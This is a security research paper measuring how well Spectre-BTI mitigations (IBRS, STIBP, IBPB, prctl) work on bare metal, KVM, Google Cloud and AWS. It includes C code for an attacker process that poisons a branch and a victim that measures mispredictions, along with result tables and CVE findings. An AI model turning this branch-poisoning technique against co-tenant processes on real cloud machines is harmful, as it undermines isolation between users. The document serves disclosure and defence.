# Hyperbleed - Current state of spectre-BTI mitigations on cloud


### Latest version of this paper/code available at [https://github.com/es0j/hyperbleed](https://github.com/es0j/hyperbleed)


### This is a working document, please send us feedback if you think we got something wrong or if we missed a citation


### Version 1.0


<p align="right">José Oliveira (esoj)  <br/>

<p align="right">Rodrigo Branco (BSDaemon)</p>



## Introduction

During our tests for reverse spectre attacks [^3][^4][^5], we have observed that the behavior of the spectre-BTI[^1] mitigations differs between a bare-metal and a cloud-based scenario. 

The Linux kernel allows userspace processes to enable mitigations by calling prctl[^2] with the PR_GET_SPECULATION_CTRL which disables the speculation feature or by using seccomp[^12].  The default behavior changed over time (from using IBPB/STIBP to IBRS).

We have measured that on some instances of Google, AWS, Azure and Oracle, the spectre-BTI mitigation using prctl still leaves the victim exposed to attacks in some cases. In this research, we tested multiple scenarios in an attempt to enumerate the causes of failure for the mitigations.



## Current Hardware Mitigations (and their software interfaces on the Linux Kernel)

The following IA32_SPEC_CTRL and IA32_PRED_CMD Model Specific Registers can be used to mitigate spectre-BTI[^9]:


![](https://i.imgur.com/cTKKs9S.png)


![](https://i.imgur.com/lSxNcMZ.png)


AMD CPUs are compatible with those definitions [^13].  For a complete breakdown on the different mitigations and the recommended usages, refer to Intel's guidance [^14].



### Indirect Branch Restricted Speculation (IBRS)

IBRS is a hardware mitigation used to prevent code from a less privileged mode to control branches executed on a more privileged mode [^6]. This mitigation is used to prevent spectre-BTI attacks against higher privileged security domains, such as kernel or host in the case of a VMM.

To enable the mitigation it is necessary to perform a write on a Model Specific Register (IA32_SPEC_CTRL.IBRS = 1, or MSR_72[0]=1) every time a context change happens from an untrusted context. 


IBRS can also be used to mitigate user-level attacks, according to Intel guidance [^6]: 


```
Additionally, when IA32_SPEC_CTRL.IBRS is set to 1 on any logical processors of that core, the predicted targets of indirect branches cannot be controlled by software that executes (or executed previously) on another logical processor of the same core.
```



### Enhanced IBRS

eIBRS supports an  'always on' mode for the IBRS (so the bit has to be set only once) [^6].



### Single Thread Indirect Branch Predictors (STIBP)

STIBP prevents code from controlling branches executed on a sibling thread. STIBP doesn't restrict previous branches from controlling future branches, therefore an IBPB must also be used.



### Indirect Branch Predictor Barrier (IBPB)

The IBPB is used to prevent future branches from being affected by old branches recorded before issuing IBPB. The IBPB isn't an operation mode but an instruction to clear (flush) the Branch Predictor Unit (BPU). It can be used to prevent untrusted software from controlling each other when executing at the same privilege level and same core. IBPB can be executed on process context switches to mitigate spectre-BTI. 



### The PRCTL syscall with PR_SET_SPECULATION_CTRL option

The prctl syscall allows the user to set mitigations for the current process [^7]. The Linux kernel uses a combination of the previously discussed hardware mitigations to protect user processes against attacks from other user applications [^10].


The mitigation for spectre-BTI can be enabled with:

```prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0);```

Similarly, the mitigation can be enabled  inby using seccomp [^11][^12]:

```syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);```



## Test Code

The test consists of two processes. The attacker constantly poisons an indirect call to speculatively redirect it to a target address. The victim process measures the mispredict rate and tries to mitigate the attack either by calling PRCTL or writing to the MSR directly using a kernel module that exposes MSR read and write operations to userspace.


```.c

/*
gcc -o victim test.c -O0 -masm=intel -w 		-DVICTIM 
gcc -o victim-PRCTL test.c -O0 -masm=intel -w 	-DVICTIM  -DPRCTL
gcc -o victim-nospecctrl test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0
gcc -o victim-IBRS test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=1
gcc -o victim-STIBP test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=2
gcc -o victim-IBPB test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0 -DIBPB
gcc -o attacker test.c -O0 -masm=intel -w  
*/

#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#ifndef PRINT_AMMOUNT
#define PRINT_AMMOUNT 1000
#endif
#define IA32_SPEC_CTRL 72

uint8_t *rdiPtr;
uint8_t unused[0x500];
uint8_t probeArray[0x1000] = {2};
uint8_t unuse2[0x500];

uint32_t f1() {}


int poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu)
{
    volatile uint8_t d;
    unsigned tries = 0;
    unsigned hits = 0;
    unsigned totalHits = 0;
    unsigned totalTries = 0;

    jitForLoop(srcAddress);
    while (1)
    {

#ifndef VICTIM
        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        continue;
#else


#ifdef IBPB
        wrmsr_on_cpu(73, cpu, 1);
#endif

        for (int i = 0; i < 100; i++)
        {
            d = *dstAddress;
            flush((uint8_t *)&rdiPtr);
            callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        }


        if (probe(&probeArray[0]) < THRESHOLD)
        {
            hits++;
            totalHits++;
        }


        totalTries++;
        if (++tries % PRINT_AMMOUNT == 0)
        {

            printf("Rate: %u/%u  MSR[72]=%d\n", hits, tries,rdmsr_on_cpu(IA32_SPEC_CTRL,cpu));
            
            #ifdef MSR
            wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
            #endif

            tries = 0;
            hits = 0;
            if (totalTries >= PRINT_AMMOUNT * 10)
            {
                break;
            }
        }
        usleep(1);
#endif
    }

    printf("Total misspredict rate: %d/%d (%.2f %)\n", totalHits, totalTries, (float)totalHits * 100 / (float)totalTries);
}


int main(int argc, char **argv)
{
    uint64_t srcAddress;
    uint64_t dstAddress;
    uint64_t cpu;

    if (argc < 4)
    {
        printf("Usage:   %s <srcAddress> <dstAddress> <cpuCore> \n", argv[0]);
        printf("Example: %s 0x55555554123 0x55555555345 1 \n", argv[0]);
        return 0;
    }

    srcAddress = (uint64_t)strtoull(argv[1], NULL, 16);
    dstAddress = (uint64_t)strtoull(argv[2], NULL, 16);
    cpu = (uint64_t)strtoull(argv[3], NULL, 16);
    SetCoreAffinity(cpu);
    uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress & (~0xfffULL)), 0x1000);
    uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress & (~0xfffULL)), 0x1000);


#ifdef PRCTL

    if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0) != 0)
    {
        perror("prctl");
    }
    printf("PRCTL GET value 0x%x\n", prctl(PR_GET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, 0, 0, 0));
#endif


#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
    wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
    printf("writing msr[%d]=%d on core %d \n", IA32_SPEC_CTRL, MSR_VAL, cpu);
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif


// set up leak gadget into position
#ifdef VICTIM
    rdiPtr = (uint8_t *)f1;
    copyLeakGadget(dstAddress);
#else
    rdiPtr = (uint8_t *)dstAddress;
    copyRetGadget(dstAddress);
#endif

    poison(srcAddress, dstAddress, cpu);

#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif

}
```


### Disclaimer

We have identified that the test code sometimes might produce false negatives (low misprediction rate).  Retrying the execution can lead to greater misprediction rate values, indicating the vulnerability.



## Control Test Setup (Bare Metal)

We used the spectre_meltdown_checker[ ^8] to verify the spectre v2 mitigations available for the machine used as control:


```
$ sudo ./spectre-meltdown-checker.sh
Spectre and Meltdown mitigation detection tool v0.45

Checking for vulnerabilities on current system
Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
[...]

* CPU vulnerability to the speculative execution attack variants
  * Affected by CVE-2017-5753 (Spectre Variant 1, bounds check bypass):  YES
  * Affected by CVE-2017-5715 (Spectre Variant 2, branch target injection):  YES
[...]

CVE-2017-5715 aka 'Spectre Variant 2, branch target injection'
* Mitigated according to the /sys interface:  YES  (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: conditional, RSB filling, PBRSB-eIBRS: Not affected)

* Mitigation 1
  * Kernel is compiled with IBRS support:  YES
    * IBRS enabled and active:  YES  (for firmware code only)
  * Kernel is compiled with IBPB support:  YES
    * IBPB enabled and active:  YES
* Mitigation 2
  * Kernel has branch predictor hardening (arm):  NO
  * Kernel compiled with retpoline option:  YES
    * Kernel compiled with a retpoline-aware compiler:  YES  (kernel reports full retpoline compilation)
> STATUS:  NOT VULNERABLE  (Full retpoline + IBPB are mitigating the vulnerability)
[...]

> SUMMARY: CVE-2017-5753:OK CVE-2017-5715:OK CVE-2017-5754:OK CVE-2018-3640:OK CVE-2018-3639:OK CVE-2018-3615:OK CVE-2018-3620:OK CVE-2018-3646:OK CVE-2018-12126:OK CVE-2018-12130:OK CVE-2018-12127:OK CVE-2019-11091:OK CVE-2019-11135:OK CVE-2018-12207:OK CVE-2020-0543:OK

```


This shows that the CPU has support for IBRS, IBPB and STIBP.


All the executed tests run the attacker process on core 0. The arguments` 0x55555554123` and `0x55555555345` are just the source and the destination of the branch and are the same for the victim and the attacker. The third argument is the core to be pinned.

The MSR module (from msr-tools) must be loaded too.

```
$ ./attacker 0x55555554123 0x55555555345 0 &
$ sudo modprobe msr
```


For the mitigation test using the IA32_SPEC_CTRL MSR, we write the desired value to the register and check if the written value stays the same until the remainder of the test, otherwise the result is discarded. Sometimes the kernel may overwrite the value on the MSR, thus disabling the mitigation, but writing to the MSR before every branch disrupts the test flow and yields wrong results.


Example of a false positive:


```
Testing victim-IBRS on core 0:
current value msr[72]=0 on core 0
writing msr[72]=1 on core 0
current value msr[72]=1 on core 0
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 667/1000  MSR[72]=0 //this bin should be discarded
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1
Rate: 0/1000  MSR[72]=1

Total misspredict rate: 667/10000 (6.67 %) //actual misspredict rate = 0% (0/9000)
current value msr[72]=1 on core 0

```


### No mitigation

Then we execute the victim code on either core 0 or its sibling thread (core 4 in this case). For the control victim code the results are:


```console
Testing victim on core 0: 
Rate: 998/1000  MSR[72]=0
Rate: 997/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 999/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Total mispredict rate: 9994/10000 (99.94 %)

real	0m0,695s
user	0m0,174s
sys	0m0,000s

Testing victim on core 4: 
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Total mispredict rate: 10000/10000 (100.00 %)

real	0m0,744s
user	0m0,235s
sys	0m0,000s
```

In this case, we observed a misprediction rate of 95%+, indicating that the attacker process can poison the victim branch.


Disabling the (in this case, the control, it was already disabled) mitigations using the MSR (obviously) returns similar results:


```
Testing victim-nospecctrl on core 0: 
current value msr[72]=0 on core 0
writing msr[72]=0 on core 0 
current value msr[72]=0 on core 0
Rate: 1000/1000  MSR[72]=0
[...]
Total misspredict rate: 9999/10000 (99.99 %)
current value msr[72]=0 on core 0
real	0m0,691s
user	0m0,168s
sys	0m0,000s

Testing victim-nospecctrl on core 4: 
current value msr[72]=0 on core 4
writing msr[72]=0 on core 4 
current value msr[72]=0 on core 4
Rate: 998/1000  MSR[72]=0
[...]
Total misspredict rate: 9988/10000 (99.88 %)
current value msr[72]=0 on core 4

real	0m0,746s
user	0m0,234s
sys	0m0,000s
```



### IBRS

By using the msr-tools, we are able to write to the IA32_SPEC_CTRL MSR by writing to the file `/dev/cpu/<cpu>/msr`.  We have used Haswell CPU for the control test, in which by setting IBRS=1 mitigates all different spectre-BTI scenarios:


```
Testing victim-IBRS on core 0: 
current value msr[72]=0 on core 0
writing msr[72]=1 on core 0 
current value msr[72]=1 on core 0
[...]
Total misspredict rate: 0/10000 (0.00 %)
current value msr[72]=1 on core 0

real	0m1,713s
user	0m0,731s
sys	0m0,094s

Testing victim-IBRS on core 4: 
current value msr[72]=0 on core 4
writing msr[72]=1 on core 4 
current value msr[72]=1 on core 4
[...]
Total mispredict rate: 0/10000 (0.00 %)
current value msr[72]=1 on core 4

real	0m1,536s
user	0m0,984s
sys	0m0,037s

```


For the IBRS tests, it's also possible to note a drastic performance decrease, from ~0.7s to ~1.5 seconds for both CPU threads; this indicates that probably speculative execution is disabled when IBRS is enabled. Commenting the line that flushes the target value for the branch improves the result, implying that the CPU spent less time on stalls in the pipeline:


```
$ time sudo ./victim-IBRS 0x55555554123 0x55555555345 4
[...]
Total misspredict rate: 0/10000 (0.00 %)
current value msr[72]=0 on core 4

real    0m1,050s
user    0m0,005s
sys     0m0,005s
```



### STIBP

STIBP aims to mitigate only speculation between sibling threads so it's expected to not mitigate attacks running on the same core:


```
Testing victim-STIBP on core 0: 
current value msr[72]=1 on core 0
writing msr[72]=2 on core 0 
current value msr[72]=2 on core 0
[...]
Total misspredict rate: 6198/10000 (61.98 %)
current value msr[72]=2 on core 0

real	0m1,102s
user	0m0,434s
sys	0m0,000s

Testing victim-STIBP on core 4: 
current value msr[72]=0 on core 4
writing msr[72]=2 on core 4 
current value msr[72]=2 on core 4
[...]
Total misspredict rate: 0/10000 (0.00 %)
current value msr[72]=2 on core 4

real	0m0,744s
user	0m0,227s
sys	0m0,006s
```


### IBPB

In our tests with IBPB, before every sequence of 100 branches an IBPB is issued.


```
Testing victim-IBPB on core 0: 
current value msr[72]=2 on core 0
writing msr[72]=0 on core 0 
current value msr[72]=0 on core 0
[...]
Total misspredict rate: 0/10000 (0.00 %)
current value msr[72]=0 on core 0

real	0m0,784s
user	0m0,259s
sys	0m0,000s

Testing victim-IBPB on core 4: 
current value msr[72]=2 on core 4
writing msr[72]=0 on core 4 
current value msr[72]=0 on core 4
[...]
Total misspredict rate: 14/10000 (0.14 %)
current value msr[72]=0 on core 4

real	0m0,838s
user	0m0,248s
sys	0m0,074s
```


In the SMT scenario, it's possible to observe some traces of speculation happening. This result is expected since after the flush of the BPU, thread 0 immediately executes a branch poisoning the BTB. However, due to the high frequency of IBPB’s in this test, it drastically reduces the speculation rate on the sibling thread. The Linux Kernel, when mitigating user-user branch injection attacks, only issues the IBPB on context switches and the sibling thread case is mitigated by STIBP (as recommended by Intel). Since we did not ensure such rigorous execution flow control when testing on usermode (we could have added synchronization but it was really not necessary for what we wanted to test), it's not possible to be sure that an attacker thread wouldn't be scheduled between a victim IBPB and a victim branch so this test may lead to some false positives, however, the results seem accurate enough. 



### PRCTL

As previously mentioned, the PRCTL syscall allows setting the speculative control for a given process [^2]. The following call can be used to mitigate spectre-BTI attacks against an user process:


```.c

prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);

```

The Linux kernel uses a combination of the previous hardware mitigations (STIBP+IBPB) to protect the process from spectre-BTI attacks. This is expected to fully protect the victim:


```
Testing victim-PRCTL on core 0: 
PRCTL GET value 0x9
Rate: 0/1000  MSR[72]=2
[...]
Rate: 0/1000  MSR[72]=2
Total misspredict rate: 0/10000 (0.00 %)

real	0m0,744s
user	0m0,200s
sys	0m0,022s

Testing victim-PRCTL on core 4: 
PRCTL GET value 0x9
Rate: 0/1000  MSR[72]=2
[...]
Rate: 0/1000  MSR[72]=2
Total misspredict rate: 0/10000 (0.00 %)

real	0m0,744s
user	0m0,222s
sys	0m0,013s
```



### Conclusion Table:

Ubuntu 22.04.1 LTS:

Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64

CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz



#### Results for Control Test Setup (Bare Metal):

| Mitigation  | Same Core  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 99.99 %  | 99.88 %   | Yes  |
| IBRS   | 0.00 %  | 0.00 %  | Yes  |
| STIBP  | 61.98 %  | 0.00 %  | Yes  |
| IBPB  | 0.00 %  | 0.14 %  |  Yes |
| PRCTL  | 0.00 %  | 0.00 %  |  Yes |


#### CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations on Linux [^15]
In some tests it was detected traces of speculative execution when using PRCTL as mitigation and seting the attacker on the same core. Further research explaned this behaviour due a Kernel bug. Previous implementation of the mitigation only marks the process as protected and dont issue the IBPB during the syscall. this leaves the process unprotected until the next schedule, thus allowing the process to execute for a short period using values already present on the BTB. 


## Tests on KVM

In the same Bare Metal machine, we set up a KVM virtual machine with an ubuntu 22.04.5 image:


```
$ virt-install -n ubuntu22 --ram=1024 --vcpus=2 --disk bus=virtio,size=10 --graphics none --location=/var/lib/libvirt/images/ubuntu-22.04.1-live-server-amd64.iso --extra-args='console=ttyS0'

//The 2 vcpus are pinned to siblings on the host machine:
$ virsh vcpuinfo ubuntutest22
VCPU:           0
CPU:            0
State:          running
CPU time:       17,9s
CPU Affinity:   y-------
VCPU:           1
CPU:            4
State:          running
CPU time:       11,9s
CPU Affinity:   ----y---
```


The spectre-meltdown checker output:


```
Checking for vulnerabilities on current system
Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
    [...]
    
CVE-2017-5715 aka 'Spectre Variant 2, branch target injection'
* Mitigated according to the /sys interface:  YES  (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: disabled, RSB filling, PBRSB-eIBRS: Not affected)
* Mitigation 1
  * Kernel is compiled with IBRS support:  YES
    * IBRS enabled and active:  YES  (for firmware code only)
  * Kernel is compiled with IBPB support:  YES
    * IBPB enabled and active:  YES
* Mitigation 2
  * Kernel has branch predictor hardening (arm):  NO
  * Kernel compiled with retpoline option:  YES
    * Kernel compiled with a retpoline-aware compiler:  YES  (kernel reports full retpoline compilation)
> STATUS:  NOT VULNERABLE  (Full retpoline + IBPB are mitigating the vulnerability)

```


#### Results for baremetal-kvm:

| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 99.95 %  | 99.99 %   | Yes  |
| IBRS   | 0.00 %  | 0.00 %  | Yes  |
| STIBP  | 99.98 %  | 0.01 % | Yes  |
| IBPB  | 0.00 %  | 98.68 %  |  Yes |
| PRCTL  | 0.01 %  | 99.98 %  |  No |

The tests showed something unexpected: all mitigations worked properly when tested individually, but the prctl is not setting the STIBP MSR like it does when executed in the host, leaving it vulnerable to SMT attacks:


```
Testing victim-STIBP on core 1:
current value msr[72]=1 on core 1
writing msr[72]=2 on core 1
current value msr[72]=2 on core 1
Rate: 1/1000  MSR[72]=2    -> CVE 2023-0045 trace
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2
Rate: 0/1000  MSR[72]=2

Total misspredict rate: 1/10000 (0.01 %)
current value msr[72]=2 on core 1
[...]

Testing victim-PRCTL on core 1:
PRCTL GET value 0x9
Rate: 1000/1000  MSR[72]=0
Rate: 999/1000   MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 999/1000   MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0
Rate: 1000/1000  MSR[72]=0

Total misspredict rate: 9998/10000 (99.98 %)
```


**The PRCTL syscall on this kernel fails to mitigate SMT BTI attacks inside the default KVM**.  Further investigation showed that in this case, besides KVM allowing proper MSR writes, the Linux kernel only implements the STIBP mitigation if the processor is executing in SMT (which makes sense on a Bare Metal system):


```c
static __always_inline void __speculation_ctrl_update(unsigned long tifp,
						      unsigned long tifn)
{
	[...]

	/* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */
	if (IS_ENABLED(CONFIG_SMP) &&
	    static_branch_unlikely(&switch_to_cond_stibp)) {
		updmsr |= !!(tif_diff & _TIF_SPEC_IB);
		msr |= stibp_tif_to_spec_ctrl(tifn);
	}

	if (updmsr)
		write_spec_ctrl_current(msr, false);
}
```

Even though both cores are siblings on the host, the guest OS believes they are not siblings (due to how the hypervisor exposes the hardware) and therefore STIBP is not necessary. This explains why MSR[72]=0 during the prctl mitigation. Reading `/sys/devices/system/cpu/cpu0/topology/thread_siblings_list` on guest shows that there is only one sibling core:

`0`


versus 2 on the guest:

`0,4`



## Tests on google cloud


#### Results for gcp-n1-standard-2-Intel_Haswell:

Google cloud shows that mitigations are available for spectre-BTI:


```
Checking for vulnerabilities on current system
Kernel is Linux 5.15.0-1025-gcp #32-Ubuntu SMP Wed Nov 23 21:46:01 UTC 2022 x86_64
CPU is Intel(R) Xeon(R) CPU @ 2.30GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available:  YES
    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
```


Google cloud output shows some different results than the ones observed in bare metal and KVM: It's never possible to write another value other than 1 to IA32_SPEC_CTRL.

```
Testing victim-nospecctrl on core 0: 
current value msr[72]=1 on core 0
writing msr[72]=0 on core 0 
current value msr[72]=1 on core 0
[...]
Rate: 1000/1000  MSR[72]=1
Total misspredict rate: 9979/10000 (99.79 %)
current value msr[72]=1 on core 0

real	0m0.879s
user	0m0.267s
sys	0m0.082s
```


This behavior is odd. Because the IA32_SPEC_CTRL is set (IBRS), but speculation still happens, and there isn't an overhead associated with disabling the speculation:

```
Testing victim-IBRS on core 0: 
current value msr[72]=1 on core 0
writing msr[72]=1 on core 0 
current value msr[72]=1 on core 0
Rate: 995/1000  MSR[72]=1
[...]
Total misspredict rate: 9945/10000 (99.45 %)
current value msr[72]=1 on core 0

real	0m0.877s
user	0m0.332s
sys	0m0.017s
```

The time here for finishing the task is 0.877s, similar to the 0.7s on bare metal and shorter than the 1.5s for IBRS on bare metal, with Haswell CPUs.  That might indicate that the hypervisor is reporting a value that is not really set in the MSR.


Since it´s not possible to enable STIBP, PRCTL is expected to fail on the sibling attack, even if prctl doesn't throw an error:


```
Testing victim-PRCTL on core 1: 
PRCTL GET value 0x9
[...]
Total misspredict rate: 9920/10000 (99.20 %)
```


| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 99.79 %  | 99.90 %   | Yes  |
| IBRS   | 99.45 %  | 0.01 % (1)  | No  |
| STIBP  | 90.47 %  | 87.62 %  | No  |
| IBPB  | 99.78 %  | 0.01 %  |  Yes |
| PRCTL  | 0.00 %  | 97.57 %  |  No |

(1) This result might be a false negative, since repeating the experiment shows higher speculation rates as observed in the data collected.

**The results show that the only effective mitigation in this machine is IBPB and that the PRCTL-based mitigation is ineffective due to lack of STIBP.**


#### Results for gcp-debian-10-haswell:

We had a surprise though when after starting a Debian 10 machine in the same processor consistently allowed for an MSR write on the IA32_SPEC_CTRL register:


```
Checking for vulnerabilities on current system
Kernel is Linux 4.19.0-22-cloud-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
CPU is Intel(R) Xeon(R) CPU @ 2.30GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available: YES 
    * CPU indicates IBRS capability: YES  (SPEC_CTRL feature bit)
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit)
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available:  YES 
    * CPU indicates STIBP capability:  YES (Intel STIBP feature bit)
```


| Mitigation  | NOSMT  | SMT  |  Expected?  |
|---|---|---|---|
| No mitigation   | 99.81 %  | 93.45 %   | Yes  |
| IBRS   | 0.01 %  | 00.03 %  | Yes  |
| STIBP  | 99.63 %  | 0.02 %  | Yes  |
| IBPB  | 0.02 %  | 86.21 %  |  Yes |
| PRCTL  | 0.02 %  | 0.04 % (1)  |  Yes |

(1) It is possible to see that the speculation rate is different than zero, but it is unclear if it's measurement noise or an actual vulnerability as will be discussed later.


Obviously just changing the OS should not give different MSR values, since it is highly unlikely that the hypervisor would show a different behavior based on the OS (kernel).  Our first guess was that when choosing a different OS we were getting into a different pool of machines.  But that also seemed unlikely.  We have decided to then upgrade the older system kernel, and oddly, saw the previous behavior again (but now we were certain we were in the same machine since the reboot was too fast for us to have had a live migration).  Our next theory was that the different kernels were using different mitigation strategies (IBRS versus IBPB with STIBP).  By starting the new upgraded system with ‘mitigations=off’ kernel parameter, we’ve noticed that we were now able again to write in the MSRs.  We then tested the other machine, and indeed, with 

‘mitigations=off’, we were able to write to the MSRs. 


Further investigation showed this behaviour was caused by a kernel bug as described by CVE 2023-1998.

#### CVE 2023-1998: Spectre v2 SMT mitigations problem [^16]

Later research explains this behaviour due a bug in the Linux Kernel that prevents the guest to properly select STIBP as a mitigation when IBRS is choosed to protect the Kernel. The Bare metal haswell reports the cpu not being vulnerable to RETBLEED, but the CPU on google cloud reports RETBLEED as one of its bugs.


oxigenio2-result.txt:

bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_unknown

gcp-n1-standard-2-intel_Haswell-result.txt

bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs mmio_stale_data retbleed

This forces the CPU on google cloud to choose IBRS as mitigation for the kernel. The bug lies in the logic of mitigation selection (https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196). The comments state that if the CPU is using IBRS, STIBP is not necessary wich is wrong, this is only valid for eIBRS.

``` 
 /* 
  * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,
  * STIBP is not required.
  */
if (!boot_cpu_has(X86_FEATURE_STIBP) ||
    !smt_possible ||
    spectre_v2_in_ibrs_mode(spectre_v2_enabled))
        return;
```
This explains why every read is 1 on google cloud guests and the mitigation is broken, since the read is done by msr kernel driver wich is set to IBRS on kernel entry and clear the SPEC_CTRL MSR on kernel exit, leaving the victim exposed to SMT attacks. It also explains why setting ‘mitigations=off’ allows the direct mitigation usign the msr module, since the SPEC_CTRL MSR is no longer modied when transitioning between kernel and user mode.

## Tests on AWS EC2

The AWS EC2 instances don't enumerate hardware mitigations, leading to SPEC_CTRL MSR being always 0 and IBPB not working:


#### Results for aws-t2.medium:

```
Checking for vulnerabilities on current system
Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
CPU is Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz

Hardware check
* Hardware support (CPU microcode) for mitigation techniques
  * Indirect Branch Restricted Speculation (IBRS)
    * SPEC_CTRL MSR is available: YES
    * CPU indicates IBRS capability: NO
  * Indirect Branch Prediction Barrier (IBPB)
    * CPU indicates IBPB capability: NO
  * Single Thread Indirect Branch Predictors (STIBP)
    * SPEC_CTRL MSR is available: YES
    * CPU indicates STIBP capability: NO
[...]

Testing victim-PRCTL on core 0: 
prctl: Operation not permitted
PRCTL GET value 0x2
Rate: 999/1000  MSR[72]=0
[...]

Rate: 1000/1000  MSR[72]=0
Total misspredict rate: 9995/10000 (99.95 %)

real	0m1.827s
user	0m0.328s
sys	0m0.000s
```


